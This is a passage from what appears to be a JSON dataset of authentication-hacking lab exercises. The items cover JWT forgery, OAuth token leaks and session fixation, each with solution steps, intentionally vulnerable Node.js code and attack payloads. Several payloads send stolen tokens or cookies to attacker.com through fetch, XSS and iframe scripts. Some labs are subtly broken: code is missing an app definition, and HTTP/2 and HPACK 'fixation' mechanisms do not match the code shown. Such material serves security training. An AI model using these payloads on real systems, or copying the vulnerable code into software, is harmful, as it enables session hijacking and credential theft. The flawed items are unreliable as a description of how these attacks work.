        "Lab Description": "This lab's GraphQL endpoint allows session fixation attacks through a vulnerable mutation. The application assigns session tokens based on client-provided values. To solve: fixate a session token and trick an admin into using it to gain privileged access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to explore the GraphQL API and identify the vulnerable mutation",
            "Craft a GraphQL request to set a custom session token via the Set-Cookie header",
            "Embed the fixed session token in a CSRF payload targeting admin users",
            "Trigger the admin's browser to make requests with your fixed session",
            "Verify compromise by accessing privileged endpoints with the fixed session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSessionToken(token: String!): String\n  }\n`);\nconst root = {\n  setSessionToken: ({ token }) => {\n    this.token = token;\n    return token;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.get('/admin', (req, res) => {\n  if (req.cookies.session === root.token) {\n    return res.send('Admin privileges granted');\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
        "payloads": [
            "mutation { setSessionToken(token: \"FIXED_SESSION_123\") }",
            "{\"query\":\"mutation { setSessionToken(token: \\\"HACKED_SESSION_456\\\") }\"}"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "This lab's JWT verification microservice improperly validates the kid header parameter. The application allows directory traversal in the key file lookup. To solve: forge a valid admin token by forcing the server to use your malicious public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT using Burp Suite and decode it to analyze the kid header",
            "Craft a token with kid header set to '../../attacker-controlled/key.pub'",
            "Generate a matching RSA key pair using OpenSSL on your attacker server",
            "Host the public key at the predictable location referenced in the kid header",
            "Submit the forged token to /admin-api endpoint and verify privileged access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/verify-token', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  const keyPath = `/keys/${decoded.header.kid}`;\n  const pubKey = fs.readFileSync(keyPath);\n  try {\n    const payload = jwt.verify(token, pubKey);\n    res.json({ valid: true, user: payload.user });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2F0dGFja2VyL2tleS5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uL3RtcC9tYWxpY2lvdXMucHViIn0.eyJ1c2VyIjoicm9vdCJ9.XFAKE_SIG"
        ]
    },
    {
        "Lab scenario": "Session swapping via GraphQL batch mutation",
        "Lab Description": "This lab's GraphQL endpoint processes batch mutations with session state conflicts. The application fails to isolate session contexts between parallel operations. To solve: execute a batch mutation that swaps your session ID with an admin's active session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to explore the GraphQL API and identify the session management mutations",
            "Craft a batch mutation containing both getSession(id: ADMIN_ID) and setSession(token: YOUR_TOKEN)",
            "Structure the operations to force session state collision using GraphQL aliases",
            "Execute the batch request and verify session takeover via the /whoami endpoint",
            "Access admin-only resources using the hijacked session context"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Mutation {\n    setSession(token: String!): String\n    getSession(id: ID!): Session\n  }\n  type Session {\n    token: String\n    user: User\n  }\n`);\nlet activeSessions = {};\nconst root = {\n  setSession: ({ token }) => {\n    activeSessions[token] = { user: 'attacker' };\n    return token;\n  },\n  getSession: ({ id }) => {\n    return activeSessions[id];\n  }\n};\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root\n}));\napp.listen(3000);",
        "payloads": [
            "[{\"query\":\"mutation { op1: setSession(token: \\\"ADMIN_SESSION\\\") op2: getSession(id: \\\"MY_SESSION\\\") { token } }\"}]",
            "{\"query\":\"mutation BatchSwap { a:setSession(token: \\\"LEGIT_TOKEN\\\") b:getSession(id: \\\"ADMIN_TOKEN\\\") { user } }\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijack via insecure PKCE implementation",
        "Lab Description": "This lab's OAuth flow implements PKCE security incorrectly. The application fails to bind the code_verifier to the authorization request. To solve: intercept an authorization code and redeem it without knowing the original code_challenge.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept the OAuth initiation request using OWASP ZAP and note the code_challenge",
            "Allow the victim to complete the authorization flow and capture the redirect with auth code",
            "Craft a token request omitting the code_verifier parameter entirely",
            "Alternatively, brute-force the code_verifier using hashcat rules",
            "Exchange the stolen authorization code for an access token and access protected resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\nlet authCodes = {};\napp.get('/oauth/authorize', (req, res) => {\n  const challenge = req.query.code_challenge;\n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes[code] = { challenge, valid: true };\n  res.redirect(`${req.query.redirect_uri}?code=${code}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  if (authCodes[code]?.valid) {\n    delete authCodes[code];\n    return res.json({ access_token: 'LEAKED_TOKEN' });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\napp.listen(3000);",
        "payloads": [
            "POST /oauth/token?code=STOLEN_CODE&client_id=CLIENT&grant_type=authorization_code",
            "POST /oauth/token {\"code\":\"HIJACKED_CODE\",\"grant_type\":\"authorization_code\",\"client_id\":\"VULN_CLIENT\"}"
        ]
    },
    {
        "Lab scenario": "JWT signature stripping via HTTP method tampering in REST API",
        "Lab Description": "This lab's JWT validation endpoint is vulnerable to HTTP method manipulation. The application fails to verify signatures on HEAD requests while still returning privileged data. To solve: extract admin credentials by bypassing signature validation.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid JWT request using Burp Suite and change the method from GET to HEAD",
            "Observe the server returns user data without signature validation",
            "Modify the JWT payload to include admin claims while keeping the original signature",
            "Resend the modified token via HEAD request to extract sensitive data",
            "Verify admin access by using extracted credentials on /admin portal"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.head('/api/user', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  res.set('X-User-Data', JSON.stringify(decoded.payload));\n  res.end();\n});\napp.get('/api/user', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  jwt.verify(token, 'secretkey', (err, decoded) => {\n    if (err) return res.status(403).send('Invalid token');\n    res.json(decoded);\n  });\n});\napp.listen(3000);",
        "payloads": [
            "HEAD /api/user HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
            "HEAD /api/user HTTP/1.1\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA authentication",
        "Lab Description": "This lab's Single Page Application implements OAuth with overly permissive CORS headers. The application exposes access tokens to arbitrary origins through insecure response headers. To solve: craft a malicious website that steals OAuth tokens through cross-origin requests.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Analyze OAuth flow using OWASP ZAP and note the Access-Control-Allow-Origin header",
            "Create an attacker page with XMLHttpRequest to the OAuth callback endpoint",
            "Host the page on a different domain and trick the victim into visiting it",
            "Capture the OAuth token in the JavaScript response handler",
            "Use the stolen token to authenticate as the victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: true,\n  credentials: true\n}));\napp.get('/oauth/callback', (req, res) => {\n  res.json({\n    access_token: 's3cret_t0ken',\n    token_type: 'bearer'\n  });\n});\napp.listen(3000);",
        "payloads": [
            "fetch('https://vulnerable.com/oauth/callback')\n  .then(res => res.json())\n  .then(token => {\n    fetch('https://attacker.com/steal?token='+token.access_token)\n  });",
            "var xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://vulnerable.com/oauth/callback');\nxhr.withCredentials = true;\nxhr.onload = function() {\n  document.location='https://attacker.com/steal?data='+xhr.responseText;\n};\nxhr.send();"
        ]
    },
    {
        "Lab scenario": "Session fixation through GraphQL websocket subscriptions",
        "Lab Description": "This lab's GraphQL over WebSocket implementation is vulnerable to session fixation during subscription initialization. The application accepts session identifiers from unauthenticated websocket connections. To solve: establish a websocket connection with a fixed session ID and trick an admin into using it.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to establish a GraphQL websocket connection and analyze the handshake",
            "Inject a custom session_id parameter during the connection_init phase",
            "Maintain the websocket connection while the session remains valid",
            "Social engineer an admin to log in while monitoring your active connection",
            "Execute privileged GraphQL operations through the hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { WebSocketServer } = require('ws');\nconst wss = new WebSocketServer({ port: 3000 });\nlet activeSessions = {};\nwss.on('connection', (ws) => {\n  ws.on('message', (data) => {\n    const msg = JSON.parse(data);\n    if (msg.type === 'connection_init') {\n      activeSessions[msg.payload.session_id] = ws;\n      ws.sessionId = msg.payload.session_id;\n    }\n  });\n});",
        "payloads": [
            "{\"type\":\"connection_init\",\"payload\":{\"session_id\":\"FIXED_SESSION_123\"}}",
            "{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"query\":\"subscription { adminData }\",\"session_id\":\"HIJACKED_SESSION\"}}"
        ]
    },
    {
        "Lab scenario": "JWT claim injection via nested JSON parsing in REST API",
        "Lab Description": "This lab's JWT implementation improperly handles nested JSON objects in claims. The application fails to validate claim structures when using the 'none' algorithm. To solve: escalate privileges by injecting nested admin claims into a valid token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT using Burp Suite and decode its structure",
            "Craft a token with alg:none containing nested JSON objects in the payload",
            "Inject {'user':{'isAdmin':true}} into the claims while removing the signature",
            "Verify token acceptance by submitting to /api/privileged-action endpoint",
            "Access admin dashboard with the forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.post('/api/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {json: true, complete: true});\n  if (decoded.header.alg === 'none') {\n    if (decoded.payload?.user?.isAdmin) {\n      return res.json({access: 'granted'});\n    }\n  }\n  res.status(403).json({error: 'Access denied'});\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7ImlzQWRtaW4iOnRydWV9fQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJjbGFpbXMiOnsiYWNjZXNzIjoid3JpdGUiLCJ1c2VyIjp7InJvbGUiOiJhZG1pbiJ9fX0."
        ]
    },
    {
        "Lab scenario": "OAuth token hijack via state parameter reflection",
        "Lab Description": "This lab's OAuth implementation reflects the state parameter without validation. The application echoes the state value in the redirect URL after authentication. To solve: craft a malicious state value that executes XSS when reflected to steal tokens.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow using OWASP ZAP and observe state parameter handling",
            "Craft a state parameter containing JavaScript payload: <script>fetch('https://attacker.com/steal?token='+document.location.hash)</script>",
            "Trick victim into initiating authentication with malicious state value",
            "Capture the access token when victim's browser executes the XSS payload",
            "Use stolen token to authenticate as victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const token = 'generated_token_' + Math.random().toString(36).substring(2);\n  res.redirect(`${req.query.redirect_uri}#token=${token}&state=${encodeURIComponent(state)}`);\n});\napp.listen(3000);",
        "payloads": [
            "/oauth/authorize?client_id=victim&state=<script>alert(document.cookie)</script>",
            "/oauth/authorize?response_type=code&state=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3F%27%2Bdocument.cookie%29%22%3E"
        ]
    },
    {
        "Lab scenario": "Session fixation via HTTP/2 header compression in REST API",
        "Lab Description": "This lab's session management is vulnerable to HPACK compression attacks in HTTP/2. The application accepts session IDs from compressed headers without proper validation. To solve: fixate a session ID by manipulating header compression and trick an admin into using it.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture HTTP/2 traffic using Burp Suite with HTTP/2 and HTTP/History enabled",
            "Analyze header compression patterns for Set-Cookie responses",
            "Craft multiple requests with specially crafted headers to manipulate HPACK state",
            "Force the server to reuse your session ID for admin's Set-Cookie header",
            "Verify session takeover by accessing privileged endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const http2 = require('http2');\nconst server = http2.createServer();\nlet sessions = {};\nserver.on('stream', (stream, headers) => {\n  if (!headers['cookie']) {\n    const sessionId = 'sess_' + Math.random().toString(36).substring(2);\n    sessions[sessionId] = {user: 'guest'};\n    stream.respond({\n      ':status': 200,\n      'set-cookie': `session=${sessionId}`,\n      'content-type': 'text/html'\n    });\n    stream.end('Session set');\n  } else {\n    const sessionId = headers['cookie'].split('=')[1];\n    stream.respond({\n      ':status': 200,\n      'content-type': 'text/html'\n    });\n    stream.end(`Current user: ${sessions[sessionId]?.user || 'none'}`);\n  }\n});\nserver.listen(3000);",
        "payloads": [
            "GET / HTTP/2\nHost: vulnerable.com\ncustom-header: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "GET / HTTP/2\nHost: vulnerable.com\ncustom-header: X\ncookie: session=FIXED_SESSION_ID"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion via JWK header injection in REST API",
        "Lab Description": "This lab's JWT implementation is vulnerable to algorithm confusion attacks through JWK header injection. The application verifies tokens using different algorithms based on the provided JWK header. To solve: forge a valid admin token by forcing the server to use a public key you control.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT using Burp Suite and analyze its structure",
            "Generate a RSA key pair using OpenSSL and host the public key on your server",
            "Craft a token with alg:RS256 and a jwk header pointing to your public key",
            "Modify the payload to include admin privileges while signing with your private key",
            "Submit the forged token to /admin-api endpoint and verify privileged access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  if (decoded.header.jwk) {\n    const key = {kty: 'RSA', e: decoded.header.jwk.e, n: decoded.header.jwk.n};\n    jwt.verify(token, key, {algorithms: ['RS256']}, (err, payload) => {\n      if (!err && payload.admin) res.json({access: 'granted'});\n      else res.status(403).json({error: 'Access denied'});\n    });\n  } else {\n    jwt.verify(token, 'HMAC_SECRET', (err, payload) => {\n      if (!err) res.json({access: 'partial'});\n      else res.status(403).json({error: 'Access denied'});\n    });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoicHVibGljLWtleS1uIiwiZSI6IkFRQUIifX0.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImt0eSI6IlJTQSIsIm4iOiJtYWxpY2lvdXMta2V5In19.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIG"
        ]
    },
    {
        "Lab scenario": "OAuth token theft via OpenID configuration hijacking",
        "Lab Description": "This lab's OAuth implementation dynamically loads OpenID configuration from an unverified location. The application follows redirects when fetching the OpenID configuration. To solve: hijack the configuration endpoint to point to your malicious server and steal authorization codes.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to intercept the OpenID configuration request",
            "Set up a malicious OpenID configuration server that points token_endpoint to your attacker server",
            "Use DNS poisoning or MITM to redirect configuration requests to your server",
            "Capture authorization codes when victims authenticate",
            "Exchange codes for tokens at your fake token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/.well-known/openid-configuration', (req, res) => {\n  const config = {\n    issuer: 'https://vulnerable-oauth.com',\n    token_endpoint: 'https://attacker.com/token'\n  };\n  res.json(config);\n});\napp.get('/auth', async (req, res) => {\n  const config = await axios.get(req.query.config_url);\n  const token = await axios.post(config.data.token_endpoint);\n  res.json({user: 'authenticated'});\n});\napp.listen(3000);",
        "payloads": [
            "GET /.well-known/openid-configuration HTTP/1.1\nHost: attacker.com",
            "/auth?config_url=http://attacker.com/.well-known/openid-configuration"
        ]
    },
    {
        "Lab scenario": "Session fixation via WebSocket connection ID reuse",
        "Lab Description": "This lab's real-time API assigns session tokens based on WebSocket connection IDs. The application reuses connection IDs when connections are dropped unexpectedly. To solve: force a connection drop and predict the next connection ID to fixate a session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Postman to establish a WebSocket connection and note the connection ID",
            "Abruptly disconnect and immediately reconnect while monitoring network traffic",
            "Analyze connection ID generation pattern using Burp Suite",
            "Predict the next connection ID and use it to establish a session",
            "Trick an admin into authenticating with your fixated connection ID"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 3000 });\nlet lastConnectionId = 1000;\nwss.on('connection', (ws) => {\n  ws.connectionId = ++lastConnectionId;\n  ws.on('message', (message) => {\n    if (message === 'AUTH') {\n      ws.sessionId = `sess_${ws.connectionId}`;\n      ws.send('AUTH_OK');\n    }\n  });\n  ws.on('close', () => {\n    lastConnectionId = ws.connectionId;\n  });\n});",
        "payloads": [
            "{\"type\":\"connect\",\"connection_id\":\"PREDICTED_ID\"}",
            "AUTH\nconnection_id:PREDICTED_ID"
        ]
    },
    {
        "Lab scenario": "JWT public key injection via x5u header in microservice authentication",
        "Lab Description": "This lab's JWT validation service improperly processes x5u headers that reference external X.509 certificates. The application fails to validate certificate sources when verifying signatures. To solve: forge an admin token by injecting your own certificate chain.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT using Burp Suite and analyze the headers",
            "Generate a self-signed certificate chain using OpenSSL",
            "Host the certificate chain on your attacker-controlled server",
            "Craft a token with x5u header pointing to your certificate and admin claims",
            "Submit the forged token to /admin endpoint and verify privileged access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  if (decoded.header.x5u) {\n    try {\n      const cert = await axios.get(decoded.header.x5u);\n      jwt.verify(token, cert.data, (err, payload) => {\n        if (!err && payload.admin) res.json({access: 'granted'});\n        else res.status(403).json({error: 'Invalid token'});\n      });\n    } catch (e) {\n      res.status(400).json({error: 'Certificate fetch failed'});\n    }\n  } else {\n    jwt.verify(token, 'SECRET_KEY', (err) => {\n      if (err) res.status(403).json({error: 'Invalid token'});\n      else res.json({access: 'partial'});\n    });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9ldmlsL2NlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIG"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via iframe in response_mode=form_post",
        "Lab Description": "This lab's OAuth implementation uses response_mode=form_post with insufficient frame busting. The application renders the token submission form in a way that allows iframe embedding. To solve: create a malicious page that loads the OAuth callback in an iframe to intercept the token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow using OWASP ZAP and observe response_mode behavior",
            "Create an attacker page with <iframe src='https://victim.com/oauth/callback?code=VALID_CODE&state=123'>",
            "Add JavaScript to monitor iframe contents for token submission",
            "Trick victim into visiting your malicious page during OAuth flow",
            "Capture the token when the form auto-submits in the iframe"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.set('view engine', 'ejs');\napp.get('/oauth/callback', (req, res) => {\n  res.render('token_post', {\n    token: 'generated_token',\n    client_id: req.query.client_id\n  });\n});\napp.listen(3000);",
        "payloads": [
            "<iframe id=\"stealer\" src=\"https://vulnerable.com/oauth/callback?code=STOLEN_CODE\"></iframe>\n<script>\n  window.addEventListener('message', (e) => {\n    if(e.data.token) fetch('https://attacker.com/steal?token='+e.data.token);\n  });\n</script>",
            "<object data=\"https://vulnerable.com/oauth/callback?code=LEAKED_CODE\"></object>"
        ]
    },
    {
        "Lab scenario": "Session fixation via HTTP/2 trailer headers in REST API",
        "Lab Description": "This lab's session management is vulnerable to trailer header injection in HTTP/2. The application processes Set-Cookie headers from trailers after the request body. To solve: craft a request with malicious trailer headers to fixate a session ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture HTTP/2 traffic using Burp Suite with 'Allow HTTP/2 ALPN override' enabled",
            "Craft a POST request with 'Trailer: Set-Cookie' header and chunked encoding",
            "Include your session ID in the trailer headers of the request",
            "Verify session fixation by checking the Set-Cookie response",
            "Trick an admin into authenticating while your session ID remains active"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\nserver.on('stream', (stream, headers) => {\n  let data = '';\n  stream.on('data', (chunk) => { data += chunk; });\n  stream.on('end', () => {\n    if (headers['trailer']) {\n      stream.on('trailers', (trailers) => {\n        if (trailers['set-cookie']) {\n          stream.respond({\n            ':status': 200,\n            'content-type': 'text/plain'\n          });\n          stream.end('Session set');\n        }\n      });\n    }\n  });\n});\nserver.listen(3000);",
        "payloads": [
            "POST / HTTP/2\nHost: vulnerable.com\nTrailer: Set-Cookie\nTransfer-Encoding: chunked\n\n0\nSet-Cookie: session=FIXATED_ID",
            "POST /api HTTP/2\nHost: target.com\nTe: trailers\nTrailer: Cookie\n\n0\nCookie: session=HIJACKED_SESSION"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT implementation fails to validate the algorithm properly. The application accepts unsigned tokens when alg:none is specified. To solve: forge a valid admin token by modifying your JWT without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid user session request with Burp Suite to capture the JWT",
            "Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
            "Modify the algorithm header to 'none' and change the role to 'admin'",
            "Remove the signature portion of the JWT (after the last dot)",
            "Submit the modified token in Authorization header to access admin panel"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'admin456', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.header.alg === 'none') {\n      if (decoded.payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    } else {\n      jwt.verify(token, 'secretkey');\n    }\n    res.send('Access denied');\n  } catch (err) {\n    res.status(403).send('Invalid token');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => console.log(`JWT Lab running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "The OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth token by intercepting the authorization flow and modifying the redirect URI.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Initiate OAuth flow and intercept the /authorize request with Burp",
            "Modify the redirect_uri parameter to point to your attacker server",
            "Let the victim complete the authentication (simulated in lab)",
            "Capture the authorization code from your server logs",
            "Exchange the stolen code for an access token at the /token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'labClient': {\n    secret: 'clientsecret123',\n    allowedRedirects: ['https://lab-client.com/callback']\n  }\n};\n\nconst authCodes = {};\nconst tokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const code = generateRandomCode();\n  authCodes[code] = { client_id };\n  \n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (!clients[client_id] || clients[client_id].secret !== client_secret) {\n    return res.status(401).json({ error: 'Invalid client credentials' });\n  }\n  if (!authCodes[code]) return res.status(400).json({ error: 'Invalid code' });\n  \n  const token = generateRandomToken();\n  tokens[token] = { client_id };\n  delete authCodes[code];\n  \n  res.json({ access_token: token, token_type: 'Bearer' });\n});\n\nfunction generateRandomCode() {\n  return Math.random().toString(36).substring(2, 15);\n}\n\nfunction generateRandomToken() {\n  return Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);\n}\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`OAuth Server running on port ${PORT}`));",
        "payloads": [
            "https://attacker.com/callback",
            "http://localhost:9999/steal",
            "https://evil.com/oauth_callback"
        ]
    },
    {
        "Lab scenario": "Session fixation in GraphQL authentication endpoint",
        "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. The application doesn't regenerate tokens after login. To solve: fixate a session token on victim then trigger authentication to gain access.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send an unauthenticated GraphQL query to obtain a session cookie",
            "Preserve this cookie and craft a phishing link containing it",
            "Trigger victim login (simulated in lab) with the fixated session",
            "Use the same session cookie to access authenticated endpoints",
            "Query sensitive user data through GraphQL to complete the lab"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n    getUserData: String\n  }\n  type Mutation {\n    login(username: String!, password: String!): String\n  }\n`);\n\nconst sessions = {};\nconst users = {\n  admin: { password: 'secret123', data: 'Sensitive admin data' }\n};\n\nconst root = {\n  getSession: (args, req) => {\n    if (!req.cookies.session) {\n      const sessionId = generateSessionId();\n      sessions[sessionId] = { authenticated: false };\n      req.res.cookie('session', sessionId);\n      return 'New session created';\n    }\n    return 'Existing session';\n  },\n  login: ({ username, password }, req) => {\n    const sessionId = req.cookies.session;\n    if (!sessionId || !sessions[sessionId]) return 'Invalid session';\n    \n    if (users[username] && users[username].password === password) {\n      sessions[sessionId].authenticated = true;\n      sessions[sessionId].username = username;\n      return 'Login successful';\n    }\n    return 'Invalid credentials';\n  },\n  getUserData: (args, req) => {\n    const sessionId = req.cookies.session;\n    if (!sessionId || !sessions[sessionId] || !sessions[sessionId].authenticated) {\n      return 'Access denied';\n    }\n    return users[sessions[sessionId].username].data;\n  }\n};\n\nfunction generateSessionId() {\n  return Math.random().toString(36).substring(2, 15);\n}\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`GraphQL Session Lab running on port ${PORT}`));",
        "payloads": [
            "mutation { login(username: \"admin\", password: \"secret123\") }",
            "query { getUserData }",
            "query { getSession }"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification microservice improperly validates the kid (key ID) header parameter. The application allows directory traversal in key file lookup. To solve: forge a valid admin token by manipulating the kid header to reference a predictable local file.",
        "Difficulty Level": "Hard",
